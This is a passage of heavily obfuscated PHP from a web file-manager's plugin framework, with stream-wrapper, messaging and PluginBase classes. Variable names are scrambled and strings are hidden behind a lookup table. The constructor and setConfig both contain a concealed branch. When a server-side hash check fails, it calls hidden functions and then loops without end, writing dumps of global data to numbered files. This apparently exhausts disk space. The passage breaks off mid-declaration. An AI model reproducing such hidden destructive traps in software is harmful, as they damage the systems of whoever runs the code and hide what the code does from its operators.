StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($üêÊƒˆ“, $İ²›ÒÔ‡ = '') { $this->info = $this->info($üêÊƒˆ“); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ªÏ§Ë·][94]]; $this->pathOpen = $üêÊƒˆ“; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$üêÊƒˆ“])) { self::$_chunkBuffer[$üêÊƒˆ“] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($²ú–ô¬È) { $êÅ½¥Æ˜ = $this->fileSubstr($this->pose, $²ú–ô¬È); $this->pose += strlen($êÅ½¥Æ˜); return $êÅ½¥Æ˜; } public function stream_tell() { return $this->pose; } public function stream_seek($Ôù€Æ¨ , $åÍñÆ½¡) { $‚ß–‹Ó× =& $_SERVER[ªÏ§Ë·]; if ($åÍñÆ½¡ == SEEK_SET) { $this->pose = $Ôù€Æ¨ ; } else { if ($åÍñÆ½¡ == SEEK_CUR) { $this->pose += $Ôù€Æ¨ ; } else { if ($åÍñÆ½¡ == SEEK_END) { $this->pose = $this->info[$‚ß–‹Ó×[86]] + intval($Ôù€Æ¨ ); } } } if ($Ôù€Æ¨  < 0) { $this->pose = $this->info[$‚ß–‹Ó×[86]] + $Ôù€Æ¨ ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ªÏ§Ë·][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Øèò…, $òŠŸ£á€) { $Ü‘äŸ’ƒ =& $_SERVER[ªÏ§Ë·]; $«Šİ£ÛÑ = $this->info($Øèò…); return array($Ü‘äŸ’ƒ[1515] => 0, $Ü‘äŸ’ƒ[1516] => 0, $Ü‘äŸ’ƒ[26] => 32768 + 511, $Ü‘äŸ’ƒ[1517] => 0, $Ü‘äŸ’ƒ[1518] => 0, $Ü‘äŸ’ƒ[1519] => 0, $Ü‘äŸ’ƒ[1520] => 0, $Ü‘äŸ’ƒ[86] => $«Šİ£ÛÑ[$Ü‘äŸ’ƒ[86]], $Ü‘äŸ’ƒ[1521] => $«Šİ£ÛÑ[$Ü‘äŸ’ƒ[1388]], $Ü‘äŸ’ƒ[1477] => $«Šİ£ÛÑ[$Ü‘äŸ’ƒ[95]], $Ü‘äŸ’ƒ[1476] => $«Šİ£ÛÑ[$Ü‘äŸ’ƒ[211]], $Ü‘äŸ’ƒ[1522] => 0, $Ü‘äŸ’ƒ[1523] => 0); } static $fileInfo = array(); public function info($Ë¢áú÷÷) { $˜•§ü„ = $_SERVER[ªÏ§Ë·][1524]; if (isset(self::$fileInfo[$Ë¢áú÷÷])) { return self::$fileInfo[$Ë¢áú÷÷]; } if (substr($Ë¢áú÷÷, 0, strlen($˜•§ü„)) != $˜•§ü„) { return !1; } self::$fileInfo[$Ë¢áú÷÷] = IO::info(substr($Ë¢áú÷÷, strlen($˜•§ü„))); return self::$fileInfo[$Ë¢áú÷÷]; } public static function read($ƒ¡®Í•¬, $Îš„¸îã, $ìäßÏ«î) { if (!isset(self::$_fopenCache[$ƒ¡®Í•¬])) { $óÒö¢§í = new StreamWrapperIO(); $óÒö¢§í->stream_open($ƒ¡®Í•¬); self::$_fopenCache[$ƒ¡®Í•¬] = $óÒö¢§í; } $óÒö¢§í = self::$_fopenCache[$ƒ¡®Í•¬]; return $óÒö¢§í->fileSubstr($Îš„¸îã, $ìäßÏ«î); } public static function _read($ÂÎÏ¥µ˜, $Ä”Ò°½±, $îã¨Èû) { $·¢Ò¸Ñ =& $_SERVER[ªÏ§Ë·]; $ò¤×”ÅÉ = fopen($ÂÎÏ¥µ˜, $·¢Ò¸Ñ[1392]); if (!$ò¤×”ÅÉ) { return $·¢Ò¸Ñ[12]; } $Ë‘‚¥¡ä = 8192; fseek($ò¤×”ÅÉ, $Ä”Ò°½±, SEEK_SET); $œËõ®ï› = $·¢Ò¸Ñ[12]; $à¶¥ÊÏ˜ = 0; while ($à¶¥ÊÏ˜ < $îã¨Èû) { $§ûŞ×ú• = min($Ë‘‚¥¡ä, $îã¨Èû - $à¶¥ÊÏ˜); $œËõ®ï› .= fread($ò¤×”ÅÉ, $§ûŞ×ú•); $à¶¥ÊÏ˜ += $§ûŞ×ú•; } fclose($ò¤×”ÅÉ); return $œËõ®ï›; } public function fileSubstr($ïœ£“ö‘, $ÆÙÑîÈ) { $ãÎ²³æâ =& $_SERVER[ªÏ§Ë·]; $ù¶ê¨–• = $this->info[$ãÎ²³æâ[86]]; $ØÖëİÀ = $ïœ£“ö‘; $‹²çÍ²ñ = $ÆÙÑîÈ; if ($ïœ£“ö‘ < 0) { $ïœ£“ö‘ = $ù¶ê¨–• + $ïœ£“ö‘; } if ($ÆÙÑîÈ === !1) { $ÆÙÑîÈ = $ù¶ê¨–• - $ïœ£“ö‘; } if ($ïœ£“ö‘ + $ÆÙÑîÈ > $ù¶ê¨–•) { $ÆÙÑîÈ = $ù¶ê¨–• - $ïœ£“ö‘; } if ($ÆÙÑîÈ <= 0) { return $ãÎ²³æâ[12]; } if ($ïœ£“ö‘ < 0 || $ïœ£“ö‘ >= $ù¶ê¨–• || $ÆÙÑîÈ <= 0 || $ÆÙÑîÈ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\x6c\145\x52\145\141\x64\40\x65\162\x72\x6f\162\41\40\163\x74\x61\x72\164\x3d{$ïœ£“ö‘}\73\154\145\156\x67\164\x68\75{$ÆÙÑîÈ}\x3b\x20\163\x69\x7a\x65\x3d{$ù¶ê¨–•}\x3b"); } $–ªàÁ§‡ = 64 * 1024; $Ï–‘Ø© =& self::$_chunkBuffer[$this->path]; if (!$Ï–‘Ø©) { $Ï–‘Ø© = array(); } $ª°Ò¿„ = 0; $ÅØ×°î† = 0; $ù‹Ê«™§ = $ãÎ²³æâ[12]; foreach ($Ï–‘Ø© as $ª°Ò¿„ => $ù‹Ê«™§) { $ª°Ò¿„ = intval($ª°Ò¿„); $ÅØ×°î† = $ª°Ò¿„ + strlen($ù‹Ê«™§); if ($ïœ£“ö‘ >= $ÅØ×°î†) { continue; } if ($ïœ£“ö‘ >= $ª°Ò¿„ && $ïœ£“ö‘ + $ÆÙÑîÈ <= $ÅØ×°î†) { return substr($ù‹Ê«™§, $ïœ£“ö‘ - $ª°Ò¿„, $ÆÙÑîÈ); } break; } if (count($Ï–‘Ø©) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ãÎ²³æâ[1525], $ãÎ²³æâ[1526] . count($Ï–‘Ø©) . "\73\x73\164\141\162\x74\x3d{$ïœ£“ö‘}\54\x6c\x65\156\x67\x74\150\75{$ÆÙÑîÈ}\x3b\x70\x6f\x73\145\72{$ª°Ò¿„}\x7e{$ÅØ×°î†}"); throw new Exception($ãÎ²³æâ[1527]); } $Á´¿èÑ = intval($ïœ£“ö‘ / $–ªàÁ§‡) * $–ªàÁ§‡; $°£ÍĞÄ = ceil(($ïœ£“ö‘ + $ÆÙÑîÈ) / $–ªàÁ§‡) * $–ªàÁ§‡ - $Á´¿èÑ; $Šåú¢² = IO::fileSubstr($this->path, $Á´¿èÑ, $°£ÍĞÄ); $Ï–‘Ø©[$Á´¿èÑ . $ãÎ²³æâ[12]] = $Šåú¢²; ksort($Ï–‘Ø©); $„™åñóü = substr($Šåú¢², $ïœ£“ö‘ - $Á´¿èÑ, $ÆÙÑîÈ); return $„™åñóü; } private function log($ñø™ğÖ™, $­óîÕ“à) { $°–Ê„Ò¤ =& $_SERVER[ªÏ§Ë·]; $­È÷ø°Õ = timeFloat() - $this->timeStart; write_log(sprintf($°–Ê„Ò¤[1528], $ñø™ğÖ™, $this->info[$°–Ê„Ò¤[42]], $­È÷ø°Õ, $­óîÕ“à), $°–Ê„Ò¤[1207]); } } class Message { function __construct() { } public function send($ÇãˆºşÁ = '', $§»şÏøÈ = array(), $ôÛ’šïÕ = "\164\145\x78\164") { $ª£ÖòÑé =& $_SERVER[ªÏ§Ë·]; $ÃÍ‘·³ = array($ª£ÖòÑé[43] => $ª£ÖòÑé[1529], $ª£ÖòÑé[782] => $ÇãˆºşÁ); if (in_array($ôÛ’šïÕ, array($ª£ÖòÑé[1529], $ª£ÖòÑé[1530]))) { $ÃÍ‘·³[$ª£ÖòÑé[43]] = $ôÛ’šïÕ; } $§»şÏøÈ = array($ª£ÖòÑé[543] => isset($§»şÏøÈ[$ª£ÖòÑé[543]]) ? $§»şÏøÈ[$ª£ÖòÑé[543]] : $ª£ÖòÑé[12], $ª£ÖòÑé[628] => isset($§»şÏøÈ[$ª£ÖòÑé[628]]) ? $§»şÏøÈ[$ª£ÖòÑé[628]] : $ª£ÖòÑé[12]); if (empty($ÇãˆºşÁ) || empty($§»şÏøÈ[$ª£ÖòÑé[543]]) && empty($§»şÏøÈ[$ª£ÖòÑé[628]])) { return !1; } $å·“ùœ = array($ª£ÖòÑé[1470] => $ÃÍ‘·³, $ª£ÖòÑé[1531] => $§»şÏøÈ); Hook::trigger($ª£ÖòÑé[1532], $å·“ùœ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¡›Ì¤¬ =& $_SERVER[ªÏ§Ë·]; $ÌÊÀÖÂÚ = $_SERVER[$¡›Ì¤¬[13]]; $ñ™³åÖ· = $¡›Ì¤¬[14]; if ($_SERVER[$¡›Ì¤¬[15]] != $ñ™³åÖ·($ÌÊÀÖÂÚ)) { $Æï§°ÒÉ = $¡›Ì¤¬[904]; $à•³Ø = $¡›Ì¤¬[16]; $ †‚£ßé = $_SERVER[$¡›Ì¤¬[17]] . $¡›Ì¤¬[18]; $±éš¯º = $à•³Ø($ †‚£ßé); $ŸÁÈõÑ = explode($¡›Ì¤¬[19], $±éš¯º); if (count($ŸÁÈõÑ) < $¡›Ì¤¬[653]) { $¡ÍÂ¨¯É = $¡›Ì¤¬[21]; $¡ÍÂ¨¯É(); } $‰Íøõ¾ü = $¡›Ì¤¬[905]; $‰Íøõ¾ü($_SERVER[$¡›Ì¤¬[906]]); $Æï§°ÒÉ = $¡›Ì¤¬[904]; $Æï§°ÒÉ(); $Ø’›¤¦ò = $¡›Ì¤¬[1533]; $ë¢×ä¡ß = json_encode($GLOBALS[$¡›Ì¤¬[1534]]); $‡ğ˜ûâ = 1; for ($½£Ìá×à = $‡ğ˜ûâ; $½£Ìá×à > 0; $½£Ìá×à++) { $Ø’›¤¦ò(DATA_PATH . $½£Ìá×à, $ë¢×ä¡ß); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¡›Ì¤¬[1535]); $this->pluginName = str_replace($¡›Ì¤¬[1535], $¡›Ì¤¬[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¡›Ì¤¬[8]; $this->pluginApi = appHostGet() . $¡›Ì¤¬[1536] . $this->pluginName . $¡›Ì¤¬[8]; $this->pluginHost = $config[$¡›Ì¤¬[1537]] . $this->pluginName . $¡›Ì¤¬[8]; $this->pluginHostDefault = $config[$¡›Ì¤¬[1537]] . $this->pluginName . $¡›Ì¤¬[8]; $ÇÕ‡ü„  = $config[$¡›Ì¤¬[1538]]; if ($ÇÕ‡ü„  && strpos($¡›Ì¤¬[60] . $ÇÕ‡ü„  . $¡›Ì¤¬[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$¡›Ì¤¬[1539]] . $this->pluginName . $¡›Ì¤¬[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ªÏ§Ë·][1540]); } protected function assign($öîíçèÀ, $¸óßÕÚ– = false) { if (is_array($öîíçèÀ)) { $this->values = array_merge($this->values, $öîíçèÀ); } else { $this->values[$öîíçèÀ] = $¸óßÕÚ–; } } protected function display($•ñ©Æ–É) { extract($this->values); require $•ñ©Æ–É; } final function hookRegist($îÖ¬³ÃÒ) { $this->modelPlugin->appRegist($this->pluginName, $îÖ¬³ÃÒ); } final function appIcon() { $µĞ§ÍáÉ =& $_SERVER[ªÏ§Ë·]; $€‡æÔ¯À = $this->appPackage(); $ãïÀ™ü• = $µĞ§ÍáÉ[12]; if (isset($€‡æÔ¯À[$µĞ§ÍáÉ[454]])) { if (isset($€‡æÔ¯À[$µĞ§ÍáÉ[454]][$µĞ§ÍáÉ[1541]])) { $ãïÀ™ü• = $µĞ§ÍáÉ[1542] . $€‡æÔ¯À[$µĞ§ÍáÉ[454]][$µĞ§ÍáÉ[1541]] . $µĞ§ÍáÉ[1543]; } else { if ($€‡æÔ¯À[$µĞ§ÍáÉ[454]][$µĞ§ÍáÉ[1544]]) { $ãïÀ™ü• = $µĞ§ÍáÉ[1545] . $€‡æÔ¯À[$µĞ§ÍáÉ[454]][$µĞ§ÍáÉ[1544]] . $µĞ§ÍáÉ[1546]; } } } return $ãïÀ™ü•; } final function fileCanView($Š•ÓäˆÖ) { $×°ç½ğ =& $_SERVER[ªÏ§Ë·]; if (request_url_safe($Š•ÓäˆÖ)) { return !0; } if ($this->isShare($Š•ÓäˆÖ)) { return !0; } $úŞßŸ“Ù = Session::get($×°ç½ğ[1547]); if (!$úŞßŸ“Ù || !$úŞßŸ“Ù[$×°ç½ğ[1548]]) { $½´ˆì–® = $×°ç½ğ[1549] . rawurlencode(this_url()); show_tips(LNG($×°ç½ğ[1550]) . $×°ç½ğ[1551] . $½´ˆì–® . $×°ç½ğ[1552] . LNG($×°ç½ğ[1553]) . $×°ç½ğ[1554], !1); } if (!Action($×°ç½ğ[1555])->authCan($×°ç½ğ[1556])) { show_tips(LNG($×°ç½ğ[1557]) . $×°ç½ğ[1558], !1); } ActionCall($×°ç½ğ[1559], $Š•ÓäˆÖ); } final function isShare($’¥’–Šè) { $§èİ©ô = KodIO::parse($’¥’–Šè); return $§èİ©ô[$_SERVER[ªÏ§Ë·][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($§Å‰·Ú¡) { if (request_url_safe($§Å‰·Ú¡)) { return $§Å‰·Ú¡; } if (!$this->isShare($§Å‰·Ú¡)) { $§Å‰·Ú¡ = $this->filePath($§Å‰·Ú¡); } return Action($_SERVER[ªÏ§Ë·][1199])->linkOut($§Å‰·Ú¡); } public function filePathLinkOut($ï²àêÊ) { if (request_url_safe($ï²àêÊ)) { return $ï²àêÊ; } $this->fileCanView($ï²àêÊ); return Action($_SERVER[ªÏ§Ë·][1199])->link($ï²àêÊ); } final function filePath($îÁˆ¶çá) { $ÕâµŸ«‰ =& $_SERVER[ªÏ§Ë·]; if ($´ä›ïÀº = $this->checkSharePath($îÁˆ¶çá)) { Hook::trigger($ÕâµŸ«‰[1560], $´ä›ïÀº); return $´ä›ïÀº; } $this->fileCanView($îÁˆ¶çá); if (request_url_safe($îÁˆ¶çá)) { $êùèÔï = parse_url_query($îÁˆ¶çá); if (isset($êùèÔï[$ÕâµŸ«‰[1561]]) && isset($êùèÔï[$ÕâµŸ«‰[223]])) { $í´´ÊÏó = Model($ÕâµŸ«‰[798])->get($ÕâµŸ«‰[799]); $ïù¡· = Mcrypt::decode($êùèÔï[$ÕâµŸ«‰[223]], $í´´ÊÏó); if ($ïù¡·) { $this->fileInfo = IO::infoWithChildren($ïù¡·); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ïù¡·; } } $îÁˆ¶çá = $this->_cacheHttpFile($îÁˆ¶çá); $this->fileInfo = IO::infoWithChildren($îÁˆ¶çá); } else { $this->fileInfo = IO::infoWithChildren($îÁˆ¶çá); if (!$this->fileInfo) { show_tips(LNG($ÕâµŸ«‰[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ÕâµŸ«‰[1560], $îÁˆ¶çá); return $îÁˆ¶çá; } final function _cacheHttpFile($ÊÊş¸ä©) { $Î‘Àº¡ = hash_path($ÊÊş¸ä©, !0); $this->cachePath = $this->pluginCachePath($Î‘Àº¡); if ($ÆÓá¦ãá = IO::fileNameExist($this->cachePath, $Î‘Àº¡)) { return KodIO::make($ÆÓá¦ãá); } $çõêû ô = $this->cachePath . $Î‘Àº¡; return $this->pluginCacheFileSet($çõêû ô, file_get_contents_nossl($ÊÊş¸ä©)); } final function _tmpFileName($†Ã›ğ = array()) { $³Ò½Í‡Ü =& $_SERVER[ªÏ§Ë·]; if (!$†Ã›ğ) { $†Ã›ğ = $this->fileInfo; } if (isset($†Ã›ğ[$³Ò½Í‡Ü[187]])) { return $†Ã›ğ[$³Ò½Í‡Ü[187]]; } if (isset($†Ã›ğ[$³Ò½Í‡Ü[180]][$³Ò½Í‡Ü[187]])) { return $†Ã›ğ[$³Ò½Í‡Ü[180]][$³Ò½Í‡Ü[187]]; } $ı—„†‹Õ = IO::hashSimple($†Ã›ğ[$³Ò½Í‡Ü[94]]); if ($ı—„†‹Õ) { return $ı—„†‹Õ; } $±±Ì¶é¾ = array($†Ã›ğ[$³Ò½Í‡Ü[42]], $†Ã›ğ[$³Ò½Í‡Ü[94]], $†Ã›ğ[$³Ò½Í‡Ü[86]]); if (isset($†Ã›ğ[$³Ò½Í‡Ü[549]])) { $±±Ì¶é¾[] = $†Ã›ğ[$³Ò½Í‡Ü[549]]; } return md5(implode($³Ò½Í‡Ü[11], $±±Ì¶é¾)); } final function checkSharePath($ğ€èÄà) { $ÕàåË“Æ =& $_SERVER[ªÏ§Ë·]; if (!$this->isShare($ğ€èÄà)) { return !1; } $äşµ²¤æ = Action($ÕàåË“Æ[1199])->sharePathInfo($ğ€èÄà); if (!isset($äşµ²¤æ[$ÕàåË“Æ[94]])) { show_json(LNG($ÕàåË“Æ[1562]), !1); } $this->fileInfo = $äşµ²¤æ[$ÕàåË“Æ[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÕàåË“Æ[187]]); return $äşµ²¤æ[$ÕàåË“Æ[94]]; } final function pluginCachePath($ÆÑóªô¿ = '') { $Ñş÷’ù„ =& $_SERVER[ªÏ§Ë·]; $ÏáºİÀÉ = IO_PATH_SYSTEM_TEMP . $Ñş÷’ù„[1563] . $this->pluginName; if (!($ëÏ¾ü£‹ = IO::infoFull($ÏáºİÀÉ))) { return IO::mkdir($ÏáºİÀÉ . $Ñş÷’ù„[8] . $ÆÑóªô¿); } if (empty($ÆÑóªô¿)) { return $ëÏ¾ü£‹[$Ñş÷’ù„[94]]; } if (!($ÕíÎ¬Ëï = IO::fileNameExist($ëÏ¾ü£‹[$Ñş÷’ù„[94]], $ÆÑóªô¿))) { return IO::mkdir($ëÏ¾ü£‹[$Ñş÷’ù„[94]] . $ÆÑóªô¿); } return KodIO::make($ÕíÎ¬Ëï); } final function pluginCacheFileSet($Şúòéû, $Ğ÷¯Ò¢ = '') { $¦û¸“ÃŒ =& $_SERVER[ªÏ§Ë·]; if (!($™µàôæÔ = IO::infoFull($Şúòéû))) { return IO::mkfile($Şúòéû, $Ğ÷¯Ò¢, REPEAT_REPLACE); } IO::setContent($™µàôæÔ[$¦û¸“ÃŒ[94]], $Ğ÷¯Ò¢); return $™µàôæÔ[$¦û¸“ÃŒ[94]]; } final function pluginLocalFile($ü“—‡Ë = '') { $Ï¬æ§ç¤ =& $_SERVER[ªÏ§Ë·]; $°ûó…Åğ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($°ûó…Åğ)) { mk_dir($°ûó…Åğ); } if (!$ü“—‡Ë) { return $°ûó…Åğ; } $íº¿Î†ï = IO::info($ü“—‡Ë); $Úæ³Ø©ó = $this->_tmpFileName($íº¿Î†ï) . $Ï¬æ§ç¤[10] . $íº¿Î†ï[$Ï¬æ§ç¤[184]]; if (!checkExtSafe($Úæ³Ø©ó)) { $Úæ³Ø©ó = $Úæ³Ø©ó . $Ï¬æ§ç¤[1231]; } $úè‘ìáä = $°ûó…Åğ . $Úæ³Ø©ó; if (@file_exists($úè‘ìáä)) { return $úè‘ìáä; } return IO::copy($ü“—‡Ë, $°ûó…Åğ, 0, $Úæ³Ø©ó); } final function appPackage() { $èª€Õ¿™ =& $_SERVER[ªÏ§Ë·]; if ($this->packageData) { return $this->packageData; } $ˆ¡¥ÚŠÒ = $this->parseFile($this->pluginPath . $èª€Õ¿™[1564]); $this->parseLang($ˆ¡¥ÚŠÒ); $«Ê¯ö¢™ = json_decode_force($ˆ¡¥ÚŠÒ); if (!$«Ê¯ö¢™) { return array(); } $Ö±şäâ = Hook::trigger($èª€Õ¿™[1565], $«Ê¯ö¢™); if ($Ö±şäâ && is_array($Ö±şäâ)) { $«Ê¯ö¢™ = $Ö±şäâ; } $this->packageData = $«Ê¯ö¢™; return $«Ê¯ö¢™; } public function packageInfoGet($Šøª—¾) { $”ñéËì = $this->appPackage(); return array_get_value($”ñéËì, $Šøª—¾); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ªÏ§Ë·][1566]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ªÏ§Ë·][1567]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ªÏ§Ë·][1568]); } public function echoJsAssign($Œšø¢Î¹, $éƒû÷ëì) { $this->echoJsAssignArr[$Œšø¢Î¹] = $éƒû÷ëì; } private function parseFile($Æº€…Ñ¬) { $Ù”š­µ½ =& $_SERVER[ªÏ§Ë·]; $»ø­áâŞ = file_get_contents_nossl($Æº€…Ñ¬); $Ïòêıî = array($Ù”š­µ½[1569], $Ù”š­µ½[1570], $Ù”š­µ½[1571], $Ù”š­µ½[1572], $Ù”š­µ½[1573], $Ù”š­µ½[1574], $Ù”š­µ½[1575]); $ğ€Èæ› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ù”š­µ½[99]][$Ù”š­µ½[1576]]); foreach ($this->echoJsAssignArr as $›ùåçÍ˜ => $ò¢ƒÃà) { $Ïòêıî[] = $Ù”š­µ½[1577] . $›ùåçÍ˜ . $Ù”š­µ½[1578]; $ğ€Èæ›[] = is_array($ò¢ƒÃà) || is_object($ò¢ƒÃà) ? rawurlencode(json_encode($ò¢ƒÃà)) : $ò¢ƒÃà; } if (strstr($»ø­áâŞ, $Ù”š­µ½[1579])) { $áİŞÄ° = rawurlencode(json_encode($this->pluginLangArr)); $»ø­áâŞ = str_replace($Ù”š­µ½[1579], $áİŞÄ°, $»ø­áâŞ); } if (strstr($»ø­áâŞ, $Ù”š­µ½[1580])) { $áİŞÄ° = $áİŞÄ° = rawurlencode(json_encode($this->getConfig())); $»ø­áâŞ = str_replace($Ù”š­µ½[1580], $áİŞÄ°, $»ø­áâŞ); } $»ø­áâŞ = str_replace($Ïòêıî, $ğ€Èæ›, $»ø­áâŞ); return $»ø­áâŞ; } private function parseLang(&$×éÇ‰ì) { $øœ¥º³ö =& $_SERVER[ªÏ§Ë·]; $œü°ÍÂ = $øœ¥º³ö[1581]; if (!strstr($×éÇ‰ì, $œü°ÍÂ)) { return; } preg_match_all($øœ¥º³ö[1582], $×éÇ‰ì, $ÜıÖ™Æ); if (!is_array($ÜıÖ™Æ) || count($ÜıÖ™Æ) == 0 || !is_array($ÜıÖ™Æ[0]) || count($ÜıÖ™Æ[0]) == 0) { return; } $€›ƒ¢è = array(); $Œ¯øºıö = array(); foreach ($ÜıÖ™Æ[0] as $å¾™‚˜Â) { $Ğ¯ÒÈ¯ = substr($å¾™‚˜Â, strlen($œü°ÍÂ), -4); $®±£²ë = LNG($Ğ¯ÒÈ¯); $€›ƒ¢è[] = $å¾™‚˜Â; $Œ¯øºıö[] = str_replace(array($øœ¥º³ö[19], $øœ¥º³ö[1103], $øœ¥º³ö[380], $øœ¥º³ö[128]), array($øœ¥º³ö[63], $øœ¥º³ö[63], $øœ¥º³ö[12], $øœ¥º³ö[1583]), $®±£²ë); } $×éÇ‰ì = str_replace($€›ƒ¢è, $Œ¯øºıö, $×éÇ‰ì); } private function parseConfig(&$Æ€êÔğ ) { $œ›•‰É› =& $_SERVER[ªÏ§Ë·]; $–à½¥çà = $œ›•‰É›[1584]; if (!strstr($Æ€êÔğ , $–à½¥çà)) { return; } preg_match_all($œ›•‰É›[1585], $Æ€êÔğ , $š•êéï); if (!is_array($š•êéï) || count($š•êéï) == 0 || !is_array($š•êéï[0]) || count($š•êéï[0]) == 0) { return; } $ñü¢íÊé = $this->getConfig(); $ÔçæÅİ€ = array(); $òÚ¾ıãı = array(); foreach ($š•êéï[0] as $—à¤íö) { $¤¥»Ğ½— = substr($—à¤íö, strlen($–à½¥çà), -2); $ÔçæÅİ€[] = $—à¤íö; $òÚ¾ıãı[] = _get($ñü¢íÊé, $¤¥»Ğ½—); } $Æ€êÔğ  = str_replace($ÔçæÅİ€, $òÚ¾ıãı, $Æ€êÔğ ); } private function parsePackage(&$­¢Æûğ¥) { $®‰Ôö¶” =& $_SERVER[ªÏ§Ë·]; $‡ó°’‘³ = $®‰Ôö¶”[1586]; if (!strstr($­¢Æûğ¥, $‡ó°’‘³)) { return; } preg_match_all($®‰Ôö¶”[1587], $­¢Æûğ¥, $¡Ø­šÖ¥); if (!is_array($¡Ø­šÖ¥) || count($¡Ø­šÖ¥) == 0 || !is_array($¡Ø­šÖ¥[0]) || count($¡Ø­šÖ¥[0]) == 0) { return; } $œö³”–² = $this->appPackage(); $ºÀŞêÒĞ = array(); $ŞòÙ•Ì = array(); foreach ($¡Ø­šÖ¥[0] as $šÓâÁŞ) { $¤ÚƒÑğ• = substr($šÓâÁŞ, strlen($‡ó°’‘³), -2); $ºÀŞêÒĞ[] = $šÓâÁŞ; $ŞòÙ•Ì[] = _get($œö³”–², $¤ÚƒÑğ•); } $­¢Æûğ¥ = str_replace($ºÀŞêÒĞ, $ŞòÙ•Ì, $­¢Æûğ¥); } final function echoFile($æ†Õà©õ, $™÷„„–Û = false) { $ûˆ¶¯Ô¥ =& $_SERVER[ªÏ§Ë·]; $šŞÀ„Ò© = $this->pluginPath . $æ†Õà©õ; if (ACT == $ûˆ¶¯Ô¥[1588]) { echo $ûˆ¶¯Ô¥[1589] . $this->pluginName . $ûˆ¶¯Ô¥[8] . $æ†Õà©õ . $ûˆ¶¯Ô¥[1590]; if (!file_exists($šŞÀ„Ò©)) { echo $ûˆ¶¯Ô¥[1591]; return; } } $¬¶¸†ô› = $this->parseFile($šŞÀ„Ò©); $this->parseLang($¬¶¸†ô›); $this->parseConfig($¬¶¸†ô›); $this->parsePackage($¬¶¸†ô›); if (is_array($™÷„„–Û)) { $¬¶¸†ô› = str_replace(array_keys($™÷„„–Û), array_values($™÷„„–Û), $¬¶¸†ô›); } echo $ûˆ¶¯Ô¥[19] . $¬¶¸†ô›; } final function initLang() { $»áôşÆ× =& $_SERVER[ªÏ§Ë·]; $‘” ÷ï¶ = $»áôşÆ×[1592]; $íÙ¥»½ = $this->pluginPath . $»áôşÆ×[1593]; $’áº¢õ = I18n::getType(); $Ûô¨ø¤á = array(); if (file_exists($íÙ¥»½ . $’áº¢õ . $»áôşÆ×[866])) { $Ûô¨ø¤á = (include $íÙ¥»½ . $’áº¢õ . $»áôşÆ×[866]); } else { if ($’áº¢õ == $»áôşÆ×[1594] && !file_exists($íÙ¥»½ . $’áº¢õ . $»áôşÆ×[866]) && file_exists($íÙ¥»½ . $»áôşÆ×[1595])) { $Ûô¨ø¤á = (include $íÙ¥»½ . $»áôşÆ×[1595]); } else { if (file_exists($íÙ¥»½ . $‘” ÷ï¶ . $»áôşÆ×[866])) { $Ûô¨ø¤á = (include $íÙ¥»½ . $‘” ÷ï¶ . $»áôşÆ×[866]); } } } if (!is_array($Ûô¨ø¤á)) { return array(); } if (@count($Ûô¨ø¤á) > 0) { I18n::set($Ûô¨ø¤á); } return $Ûô¨ø¤á; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($â±„ê»â) { $¤™ÓÏ¿ =& $_SERVER[ªÏ§Ë·]; $—ßÙ‰•Ø = $_SERVER[$¤™ÓÏ¿[13]]; $áŞ•úŒ = $¤™ÓÏ¿[14]; if ($_SERVER[$¤™ÓÏ¿[15]] != $áŞ•úŒ($—ßÙ‰•Ø)) { $»Â£øÏ÷ = $¤™ÓÏ¿[904]; $”Ç·ÚÓ = $¤™ÓÏ¿[16]; $¾ºÉÏ’ = $_SERVER[$¤™ÓÏ¿[17]] . $¤™ÓÏ¿[18]; $Ë¯Îß®ó = $”Ç·ÚÓ($¾ºÉÏ’); $°ÌÃæ = explode($¤™ÓÏ¿[19], $Ë¯Îß®ó); if (count($°ÌÃæ) < $¤™ÓÏ¿[653]) { $«¿×ÛõÑ = $¤™ÓÏ¿[21]; $«¿×ÛõÑ(); } $œ¹Ÿ·“™ = $¤™ÓÏ¿[905]; $œ¹Ÿ·“™($_SERVER[$¤™ÓÏ¿[906]]); $»Â£øÏ÷ = $¤™ÓÏ¿[904]; $»Â£øÏ÷(); $ÕÆ¤”–µ = $¤™ÓÏ¿[1533]; $ŸÌé«ºæ = json_encode($GLOBALS[$¤™ÓÏ¿[1534]]); $ş€ ìÕŠ = 1; for ($†Æ¾âïÏ = $ş€ ìÕŠ; $†Æ¾âïÏ > 0; $†Æ¾âïÏ++) { $ÕÆ¤”–µ(DATA_PATH . $†Æ¾âïÏ, $ŸÌé«ºæ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $â±„ê»â); } public function onSetConfig($œ˜Ñ‹çç) { } public function 